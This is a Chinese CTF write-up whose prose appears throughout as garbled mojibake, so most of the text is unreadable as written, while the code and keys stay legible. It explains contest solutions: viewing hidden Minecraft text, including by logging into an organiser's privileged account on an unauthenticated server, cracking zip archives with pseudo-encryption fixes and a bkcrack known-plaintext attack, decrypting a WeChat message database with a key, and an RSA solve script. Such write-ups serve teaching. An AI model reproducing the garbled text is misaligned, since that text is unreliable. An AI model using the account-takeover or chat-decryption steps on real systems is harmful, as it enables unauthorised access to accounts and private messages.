`r=lambda x,s:(x<<s|x>>8-s)&255\ns=['63']*256;p=q=1\nfor o in[0]*255:p=(p^(p*2)^[27,0][p<128])&255;q^=q*2;q^=q*4;q^=q*16;q&=255;q^=[9,0][q<128];s[p]=f'{q^r(q,1)^r(q,2)^r(q,3)^r(q,4)^99:02x}'`

### ç»ˆæè°œè¯­äºº

flagï¼š`r00t{464ff077b7e7896d0ead9a7398ae98a3}`  
ã€Œè‡³é«˜å¥¥ä¹‰ã€ï¼š`åšæ¢¦ æ„å¿µ æƒé™ å†…åœ¨ çœŸç›¸ æªè¾ ä¿®æ”¹ å›å®¶ é»„çº¢ æ±¡æ¸ æ‰­æ›² å›¾ç‰‡`

ä¸€å¼ æ— æ³•äº’åŠ¨çš„MCåœ°å›¾ï¼ŒçŸ—ç«‹çš„çŸ³ç¢‘ä¸­å¤®åµŒç€ä¸€ä¸ª[æ–‡æœ¬å±•ç¤ºå®ä½“](https://zh.minecraft.wiki/w/%E5%B1%95%E7%A4%BA%E5%AE%9E%E4%BD%93)ï¼Œæ­£å¸¸æƒ…å†µä¸‹æ— æ³•çœ‹åˆ°é‡Œé¢çš„æ–‡æœ¬ã€‚çœ‹èµ·æ¥å¾ˆç¦»è°±ï¼Œä½†å…¶å®æœ¬é¢˜çš„é¢„æœŸè§£æœ‰ç›¸å½“å¤šç§ï¼Œæ“ä½œéš¾åº¦çš„ä¸Šä¸‹é™å·®åˆ«å¾ˆå¤§ï¼ˆé¢˜ç›®åŸå®šåå«â€œå…«ä»™è¿‡æµ·â€æ¥ç€ï¼ŒæœŸå¾…å„ä½å„æ˜¾ç¥é€šï¼‰ï¼š

- ç”¨ä¸‹è½½æœåŠ¡ç«¯åœ°å›¾çš„å·¥å…·æˆ–è€…MODæŠŠåœ°å›¾ä¸‹è½½åˆ°æœ¬åœ°æ‰“å¼€ï¼Œåˆ‡æ¢åˆ°åˆ›é€ æ¨¡å¼ï¼ŒæŠŠçŸ³ç¢‘ç ¸ç¢
	- æ³¨æ„æ–‡å­—æ˜¯ä»¥å®ä½“å½¢å¼å­˜åœ¨çš„ï¼Œæ‰€ä»¥ç”¨çš„å·¥å…·æˆ–è€…MODå¿…é¡»æ”¯æŒä¿å­˜å®ä½“ï¼ˆå®æµ‹[WorldTools](https://modrinth.com/mod/worldtools)å¯ä»¥ç”¨ï¼Œä½†[Minecraft World Downloader](https://github.com/mircokroon/minecraft-world-downloader)å°±ä¿å­˜ä¸äº†å®ä½“ï¼‰
- åšä¸€ä¸ªè‡ªå®šä¹‰é»‘è‰²æ··å‡åœŸï¼ˆçŸ³ç¢‘æè´¨ï¼‰[æ–¹å—æ¨¡å‹](https://zh.minecraft.wiki/w/%E6%A8%A1%E5%9E%8B#%E6%96%B9%E5%9D%97%E6%A8%A1%E5%9E%8B)çš„èµ„æºåŒ…ï¼Œè®©çŸ³ç¢‘ä¸å¯è§
	- ä¾‹å¦‚å¯ä»¥ä¿®æ”¹é»‘è‰²æ··å‡åœŸçš„æ–¹å—çŠ¶æ€ï¼ˆ`assets/minecraft/blockstates/black_concrete.json`ï¼‰ï¼Œç”¨å±éšœæ–¹å—çš„æ¨¡å‹ï¼ˆ`minecraft:block/barrier`ï¼‰æ›¿æ¢é»‘è‰²æ··å‡åœŸçš„æ¨¡å‹ï¼ˆ`minecraft:block/black_concrete`ï¼‰ï¼Œè¿›å…¥æ¸¸æˆåº”ç”¨èµ„æºåŒ…ï¼ŒçŸ³ç¢‘å°±é€æ˜äº†
	- ä¸€ä¸ªå¦‚æ­¤æ”¹å¥½çš„èµ„æºåŒ…å‚è§`rtctf24h2-solver.zip`ï¼Œé€‚ç”¨MCç‰ˆæœ¬1.20.6
- ç”¨å¸¦è‡ªç”±è§†è§’ä¹‹ç±»åŠŸèƒ½çš„MODæˆ–æŒ‚ç«¯ç›´æ¥ç©¿å¢™çœ‹å­—
- ~~å‘ç°æœåŠ¡å™¨æ²¡å¼€æ­£ç‰ˆéªŒè¯è€Œä¸”å‡ºé¢˜äººåå­—çš„è´¦å·æœ‰OPæƒé™ï¼Œç›´æ¥ç™»ä¸ŠæœåŠ¡å™¨æŠŠçŸ³ç¢‘ç ¸äº†ï¼ˆ~~ æ¼æ´å·²ä¿®å¤
- å‘ç°æœåŠ¡å™¨æ²¡å¼€æ­£ç‰ˆéªŒè¯è€Œä¸”å‡ºé¢˜äººåå­—çš„è´¦å·æ˜¯æ—è§‚æ¨¡å¼ï¼Œç©¿å¢™çœ‹å­—

~~ä¸æ˜¯æ¯ç§é¢„æœŸè§£å‡ºé¢˜äººéƒ½è¯•è¿‡å°±æ˜¯äº†ï¼ˆ~~

ç„¶åä½ å°±ä¼šå¾—åˆ°ä¸€å±å¹•ä¸æ˜æ‰€ä»¥çš„æ±‰å­—ï¼Œå…¶ä¸­è‹¥å¹²å­—è¯è¢«æ‰“ç äº†ï¼ˆ`Â§k`ï¼‰ï¼Œä¸åœå˜åŒ–ï¼Œçœ‹ä¸å‡ºæ˜¯ä»€ä¹ˆã€‚æ¢å¤è¿™äº›å­—è¯åŒæ ·æœ‰è‹¥å¹²ç§é¢„æœŸè§£ï¼š

- ï¼ˆå¦‚æœä¸‹è½½äº†åœ°å›¾ï¼‰ç”¨æ¸¸æˆå†…çš„[`/data get entity`å‘½ä»¤](https://zh.minecraft.wiki/w/%E5%91%BD%E4%BB%A4/data)è·å–æ–‡æœ¬å±•ç¤ºå®ä½“çš„NBTæ•°æ®ï¼Œå…¶ä¸­è¢«æ‰“ç çš„æ–‡æœ¬æ˜¯å¯è§çš„
- ï¼ˆåŒæ ·è¦ä¸‹è½½åœ°å›¾ï¼‰ç›´æ¥å»å­˜æ¡£çš„`entities`æ–‡ä»¶å¤¹é‡Œ[æ‰‹åŠ¨è§£æå®ä½“æ•°æ®](https://zh.minecraft.wiki/w/%E5%AE%9E%E4%BD%93%E6%95%B0%E6%8D%AE%E6%A0%BC%E5%BC%8F#.E5.AD.98.E5.82.A8.E6.A0.BC.E5.BC.8F)
- å¦‚æœç›´æ¥å»ç½‘ä¸Šæœç´¢è¿™äº›æ±‰å­—æ„æˆçš„éƒ¨åˆ†å®Œæ•´å¥å­ï¼Œä¸éš¾å‘ç°åŸæ–‡å‡ºè‡ªæ¸¸æˆã€Šæ§åˆ¶ã€‹çš„[â€œå¸Œæ–¯é­”å’’â€](https://control.fandom.com/zh/wiki/%E5%B8%8C%E6%96%AF%E9%AD%94%E5%92%92)ï¼ˆæœ‰åˆ å‡ä¸”é¡ºåºè¢«æ‰“ä¹±ï¼‰ï¼›å¯¹ç…§åŸæ–‡å®Œå½¢å¡«ç©ºå³å¯
- ç»™æ¸¸æˆå†™ä¸ªMODç¦ç”¨[JSONæ–‡æœ¬ç»„ä»¶](https://zh.minecraft.wiki/w/%E6%96%87%E6%9C%AC%E7%BB%84%E4%BB%B6)çš„`obfuscated`å±æ€§
- ~~ä¸è¦è¯•å›¾æˆªå›¾é€‰è€å©†ï¼Œå¦‚æœä½ èƒ½æˆªå›¾æˆªå‡ºæ­£ç¡®çš„è¯ï¼Œå»ºè®®ä½ æ”¾å¼ƒæ–°ç”Ÿèµ›å»ä¹°å½©ç¥¨~~

æ‰¾é½è¢«æ‰“ç çš„äºŒåå››å­—ä¹‹åè¾“å…¥åˆ°é¢˜ç›®æä¾›çš„ç½‘é¡µï¼ˆæ²¡æœ‰é¡ºåºè¦æ±‚ï¼‰å³å¯å¾—åˆ°flagã€‚

#### èŠ±çµ®

è¿™é“é¢˜çš„ç‚¹å­æ¥è‡ªweek1å¼ƒå‘çš„MCé¢˜çš„å¤‡ç”¨ç‚¹å­ï¼ˆäººè¯ï¼šåºŸæ¡ˆçš„åºŸæ¡ˆï¼‰ï¼šç”¨ä¸€å—åŸºå²©æŒ¡ä½flagçš„ä¸€éƒ¨åˆ†ï¼Œè®©ç©å®¶ä»¬ä½¿å‡ºå…¨èº«è§£æ•°æƒ³åŠæ³•çœ‹åˆ°åŸºå²©æŒ¡ä½çš„éƒ¨åˆ†ï¼›ç»“æœweek1çš„æ¸¸æˆé¢˜å‡ºå®Œäº†ä¹‹åè°œè¯­äººä¹‹é­‚å‘ä½œï¼Œæƒ³ç€â€œä¸èƒ½ç ´åçš„æ–¹å—ä¸Šè®°å½•ç€ä¼—äººçš„ç»ˆæè¿½æ±‚â€è¿™ä¸€æ¦‚å¿µå¾ˆæœ‰ç¥ç§˜æ„Ÿï¼Œå¤šæ•´äº†ä¸€å †æ´»ï¼Œå°±å˜æˆäº†è¿™ä¹ˆä¸€é“é¢˜ã€‚æ–°çš„é¢˜ç›®åç§°â€œç»ˆæè°œè¯­äººâ€~~é™¤äº†åœ¨è¯´å‡ºé¢˜äººå®åœ¨ä¸æŸ¿ä¸ªå¥½äººé’ ä¹‹å¤–~~æ›´æ˜¯åœ¨æŒ‡ä»£é¢˜ç›®ä¸­çš„ç¥ç§˜å…ƒç´ ã€‚

ï¼ˆä¸æŒ‡æœ›æœ‰äººèƒ½çœ‹å‡ºçš„ï¼‰é¢„å‘Šå›¾å’Œé¢˜ç›®ä¸­çš„æ¢—æ˜¯å‡ºè‡ªå°è¯´/ç”µå½±ã€Š2001ï¼šå¤ªç©ºæ¼«æ¸¸ã€‹çš„[é»‘æ–¹ç¢‘](https://2001.fandom.com/wiki/Monolith)ï¼ŒMCåœ°å›¾çš„ç¯å¢ƒå¸ƒç½®ä¹Ÿæ˜¯åœ¨æ¨¡æ‹ŸTMA-0å’ŒTMA-1ä¸¤å—é»‘æ–¹ç¢‘çš„å‘¨é­ç¯å¢ƒï¼ˆTo ~~ç¾¤èŒæ–°~~ æ»‘ç¨½ï¼šè‡ªå®šä¹‰ç»´åº¦ä»¤ä¸»ä¸–ç•Œä½¿ç”¨æœ«åœ°ç”Ÿç‰©ç¾¤ç³»ä¸”åœ°è¡¨Y<0ï¼Œå°±èƒ½åˆ›é€ å¤©ä¸Šæœ‰å¤ªé˜³ã€å››å‘¨æœ‰å…‰äº®ä½†å¤©æ˜¯é»‘è‰²çš„å¥‡æ™¯ï¼‰ã€‚çœ‹ä¸æ‡‚ä¹Ÿæ²¡å…³ç³»ï¼Œè¿™ä¸ªæ¢—å’Œåšé¢˜ä¸€ç‚¹å…³ç³»éƒ½æ²¡æœ‰å°±æ˜¯äº†ï¼ˆ

### zipçš„å››ç§è§£æ³•

"encryptedï¼Ÿ.zip"æ˜¯ä¼ªåŠ å¯†ï¼Œå°†å‹ç¼©æºæ–‡ä»¶ç›®å½•åŒºï¼ˆ504B0102å¼€å§‹ï¼‰çš„å…¨å±€æ–¹å¼ä½æ ‡è®°ï¼ˆç¬¬ä¹å’Œç¬¬åä¸ªå­—èŠ‚ï¼‰æ”¹ä¸º0800å³å¯è§£å‹ï¼Œ"encrypted.zip"éœ€è¦ä½¿ç”¨bkcrackè¿›è¡Œæ˜æ–‡æ”»å‡»ï¼Œå‹ç¼©åŒ…ä¸­æœ‰"picture.png"ï¼Œæ ¹æ®pngå›ºå®šæ ¼å¼æ„é€ è¶…è¿‡12å­—èŠ‚çš„æ–‡ä»¶æ˜æ–‡æ”»å‡»ï¼Œè·å–å¯†é’¥a121e562 06b6a7e6 45d2e1b7ï¼Œåˆ©ç”¨å¯†é’¥æå–"zip"æ–‡ä»¶ï¼Œè¡¥å…¨å…¶æ–‡ä»¶å¤´504B0304å’Œåç¼€ï¼Œè§£å‹å¾—åˆ°"æ¼”ç¤ºæ–‡ç¨¿1.ppt"ï¼Œå°†åç¼€æ”¹ä¸º.zipå†è§£å‹æ‰“å¼€ï¼Œèƒ½ç›´æ¥æ‰¾åˆ°flag.xml

### åƒå±‚çƒ§é¥¼

è¿™ä¸ªå‹ç¼©åŒ…å¥—å¨ƒæ¯ä¸€å±‚çš„å¯†ç å°±æ˜¯å‹ç¼©åŒ…åï¼Œæ ¼å¼ä¸º7zæˆ–zipï¼Œäºæ˜¯å°±å¯ä»¥å†™å‡ºå¯¹åº”çš„è„šæœ¬è¿›è¡Œè§£å‹ï¼Œæˆ–è€…ç›´æ¥å¯¹aiæå‡ºä½ çš„è¯‰æ±‚è®©å®ƒæ¥å†™ï¼Œæ¯”å¦‚ä¸‹é¢è¿™ä¸ªpythonè„šæœ¬ï¼š



```python
import os
import re
import pyzipper
import py7zr

# ä»æ–‡ä»¶åä¸­æå–å¯†ç 
def get_password_from_filename(filename):
    # åŒ¹é…æ–‡ä»¶åä¸­çš„å››ä½æ•°å­—ä½œä¸ºå¯†ç 
    match = re.search(r'\b\d{4}\b', filename)
    return match.group() if match else None

# ä½¿ç”¨æ–‡ä»¶åå¯†ç è§£å‹æ–‡ä»¶
def decompress_with_filename_password(file_path, output_dir):
    password = get_password_from_filename(os.path.basename(file_path))
    if password is None:
        print(f"No valid password found in filename {file_path}.")
        return False, None
    try:
        if file_path.endswith('.zip'):
            with pyzipper.AESZipFile(file_path) as zipf:
                zipf.setpassword(password.encode())
                zipf.extractall(output_dir)
            print(f"Success! Password for {file_path} is {password}")
            return True, os.path.join(output_dir, os.listdir(output_dir)[0])

        elif file_path.endswith('.7z'):
            with py7zr.SevenZipFile(file_path, password=password) as archive:
                archive.extractall(output_dir)
            print(f"Success! Password for {file_path} is {password}")
            return True, os.path.join(output_dir, os.listdir(output_dir)[0])

    except Exception as e:
        print(f"Failed to extract {file_path} with password {password}: {e}")
        return False, None

# é€å±‚è§£å‹ç¼©
def decompress_multiple_layers(compressed_file, layers=1000):
    current_file = compressed_file
    output_base_dir = R"decompressed_files"  # æŒ‡å®šè§£å‹åçš„æ–‡ä»¶å¤¹
    if not os.path.exists(output_base_dir):
        os.makedirs(output_base_dir)  # å¦‚æœç›®å½•ä¸å­˜åœ¨åˆ™åˆ›å»º

    for layer in range(layers):
        layer_output_dir = os.path.join(output_base_dir, f"layer_{layer + 1}")
        os.makedirs(layer_output_dir, exist_ok=True)

        success, next_file = decompress_with_filename_password(current_file, layer_output_dir)
        if not success:
            print(f"Unable to decrypt layer {layer + 1}. Exiting.")
            break

        print(f"Layer {layer + 1}: Successfully extracted.")
        current_file = next_file

        # å¦‚æœå·²è¾¾åˆ°è§£å‹å®Œæˆçš„æ–‡ä»¶ï¼ˆéå‹ç¼©æ–‡ä»¶ï¼‰ï¼Œåˆ™åœæ­¢
        if not (current_file.endswith('.zip') or current_file.endswith('.7z')):
            print("Reached final uncompressed file.")
            break

    print(f"Final extracted file path: {current_file}")

def main():
    final_compressed_file = R"5155.7z"  # æ›¿æ¢ä¸ºæœ€ç»ˆç”Ÿæˆçš„å‹ç¼©æ–‡ä»¶è·¯å¾„
    decompress_multiple_layers(final_compressed_file, layers=1000)

if __name__ == '__main__':
    main()
```

è§£å‹1000å±‚å¾—åˆ°æ–‡ä»¶flag.zipï¼Œå¯ä»¥æŒ‰ç…§ä¹‹å‰çš„æ ¼å¼ç”¨4ä½æ•°å­—æš´åŠ›ç ´è§£ï¼Œæˆ–è€…ç›´æ¥æ ¹æ®é¢˜ç›®æè¿°å¾—åˆ°å¯†ç 1960ï¼Œè§£å‹åçš„txtä¸­å«æœ‰é›¶å®½åº¦å­—ç¬¦éšå†™ï¼Œé€šè¿‡https://www.mzy0.com/ctftools/zerowidth1/è§£å¯†å¾—åˆ°flagã€‚

### çˆ¬å¡”æ¸¸æˆ

å‹ç¼©åŒ…è§£å‹å¯†ç æ˜¯å¼€èµ›æ—¥æœŸå…«ä½æ•°å­—

ç¬¬ä¸€å±‚ï¼šhintæ˜¯é˜´é˜³æ€ªæ°”åŠ ç ï¼Œthe_first-is_always_simpleï¼Œè§£å‹ä¹‹åå›¾ç‰‡æ”¹å®½é«˜å³å¯
r00t{zheshidiyiceng_

ç¬¬äºŒå±‚ï¼šå‹ç¼©åŒ…è§£å¯†éœ€è¦ç”¨åˆ°ç¬¬ä¸€å±‚çš„â€œr00t{zheshidiyiceng\_â€ï¼Œhintæ˜¯æ±¤å§†ç tomtomåŠ å¯†
è§£å‡ºæ¥æ˜¯â€œdi_er_ceng_zen_me_zuoâ€ï¼Œé€šè¿‡æ­£åˆ™è¡¨è¾¾å¼^([a-z){3}\d[a-z]$çˆ†ç ´ä»å›¾ç‰‡é‡Œè§£å‡ºæ¥çš„å‹ç¼©åŒ…ï¼Œå¯†ç æ˜¯sxy2eï¼Œ
ttthhheeesecondfloor_

ç¬¬ä¸‰å±‚ï¼šå‹ç¼©åŒ…è§£å¯†éœ€è¦ç”¨åˆ°ç¬¬äºŒå±‚çš„â€œttthhheeesecondfloor_â€ï¼Œå›¾ç‰‡éå¤å¤šï¼Œçœ‹çœ‹äº¤ç‚¹
å››ä¸ªäº¤ç‚¹ä»£è¡¨â€œ-â€ ä¸‰ä¸ªäº¤ç‚¹ä»£è¡¨ç©ºæ ¼ ä¸¤ä¸ªäº¤ç‚¹ä»£è¡¨â€œ.â€ï¼Œæ‘©æ–¯ç”µç è§£å‡ºæ¥æ˜¯â€œthat_3hirdâ€
010æ‰“å¼€flag3.zipç»“å°¾å¤„base64è§£ç å¾—åˆ°123951ï¼Œå»è§£å‹å¦ä¸€ä¸ªå‹ç¼©åŒ…ã€‚
base62åŠ ç ï¼šxihuanwan_misc_ma

ç¬¬å››å±‚ï¼šå‹ç¼©åŒ…è§£å¯†éœ€è¦ç”¨åˆ°ç¬¬ä¸‰å±‚çš„â€œxihuanwan_misc_maâ€ï¼ŒæŸ¥çœ‹hint4.txtï¼Œéƒ½2024å¹´äº†ä¸ä¼šè¿˜æœ‰äººè§£ä¸å‡ºU2FsdGVkX1+y2rlJZlJCMnvyDwHwzkgHvNsG2TF6sFlBlxBs0w4EmyXdDe6s7viLå§
ç”¨åˆ°Triple DESè§£å¯†ï¼Œè§£å‹å‹ç¼©åŒ…ï¼Œhint.txtä¸­çš„å­—ç¬¦ä¸²é€šè¿‡Caesarè°ƒæ•´æˆ1a813cbb17c040358d772e37fa137edbeddedb38bf704a56b2a9e22dc7f05f77
.dbæ˜¯å¾®ä¿¡æ•°æ®åº“å¤‡ä»½æ–‡ä»¶ï¼Œpyè§£å¯†æ¢å¤æ–‡ä»¶ã€‚cmdä¸­æ‰§è¡Œpython shuju.py -k 1a813cbb17c040358d772e37fa137edbeddedb38bf704a56b2a9e22dc7f05f77 -d MSG0.db 62914560
å…¶ä¸­shuju.pyè‡ªå·±ä¸Šcsdnæœç´¢å¾®ä¿¡æ•°æ®åº“è§£å¯†ã€‚
ä½¿ç”¨DB Browser for SQLiteæŸ¥çœ‹æ–‡ä»¶
å¾—åˆ°flag4:L1u_and_K1cky_Mu

ç¬¬äº”å±‚ï¼šå‹ç¼©åŒ…è§£å¯†éœ€è¦ç”¨åˆ°ç¬¬å››å±‚çš„â€œL1u_and_K1cky_Muâ€ï¼Œç”¨serpentéšå†™è§£å‡ºé‡Œé¢çš„txtï¼Œå¯†ç æ˜¯seecret
ç„¶åæ˜¯é›¶å®½éšå†™
flagæ˜¯u_r_50_5m4rt!

ç„¶åç”¨md5åŠ å¯† r00t{zheshidiyiceng\_|ttthhheeesecondfloor_|xihuanwan_misc_ma|L1u_and_K1cky_Mu|u_r_50_5m4rt!

å¾—åˆ°31aada169d9a5b6831a0792d47b1f229
å¥—ä¸Šr00tå°±æ˜¯flagäº†ã€‚

## crypto

### rrrrrrrrsa

Sloth é€‰æ‹”èµ›çš„ç¬¬ä¸€é¢˜

æ™®é€šçš„RSAï¼Œä½†æ˜¯ç”¨äº†8ä¸ª256ä½ç´ æ•°ï¼Œå¹¶`leak`äº†å…¶ä¸­2ä¸ªï¼Œflagæ˜¯`r00t2024{uuid}`ï¼Œæ¼æ´ç‚¹æ˜¯æ˜æ–‡åœ¨åŠ å¯†æ—¶æ²¡æœ‰åšpaddingã€‚åˆ†æå¯å¾—æ˜æ–‡çš„é•¿åº¦æ˜¯uuidé•¿åº¦åŠ 10çš„bytesï¼Œè€Œæ³„éœ²çš„ç´ æ•°ï¼ˆä»¤å…¶æ˜¯p1ä¸p2ï¼‰ï¼Œå…±512bitsï¼Œæ•…åœ¨modæ“ä½œä¸‹ä¸èµ·ä½œç”¨ã€‚leakåˆæ³„éœ²äº†ä¸¤ä¸ªç´ æ•°ï¼Œæ‰€ä»¥å¯ä»¥é¡ºåˆ©è§£å¯†ã€‚å…¶å®å³ä½¿æ²¡æœ‰ä»¥ä¸Šçš„åˆ†æï¼Œç”¨æ™®é€šçš„RSAè§£å¯†çš„æ–¹æ³•è¯•ä¸€æ¬¡ä¹Ÿå°±åšå‡ºæ¥äº†- -

```python
from gmpy2 import invert
import libnum

e = 65537
n = 1948831226367808333023454598602847640240062226497220535305464948946806428826427888320323260065910371729498744016762049074280602708071244743861289847071010098857709918912568267082765736138208189380839308228760420357247846848198571932896799280257004218095898229830549900729475994574514199214974647651643868770999990755773821706586940779568043877890095238553821958996719637584404983370656917447866461520026730561106521512372792028476739337988464433131160954386181373965071872699552959911375040849790362842745704396532895687290320055533574951232877797904916847025368705453945796905953508376628140140310371102526789326909
c = 1787789892903050535448764340663183386718548752068882054116697949422762809906200265067322273461327359917952855207073599958677616481115690732238321689032202235534289027860250827298938800229743364624139255201645663660712723677963010438634663962079825609567910790482763112867545903928917669200180481743808576607223091090410963635701963504192628345731495406509220606691058648878512289757356617962961876291015927601077929841648482652289324194004829539854744629227190949688622109451495340467877267395807518644502010968910668506141542536982013502638532959177937481777444704866341974936101375766752745353691699260796722226392
p, q = [60592667249989731023949695957858195905249904357039946449852987631969604549343, 83365131057176342554624416364767324909519920184318725911963559984830477147249]

phi = (p-1)*(q-1)
d = invert(e, phi)
m = pow(c, d, p*q)
flag = libnum.n2s(int(m))
print(flag)
```

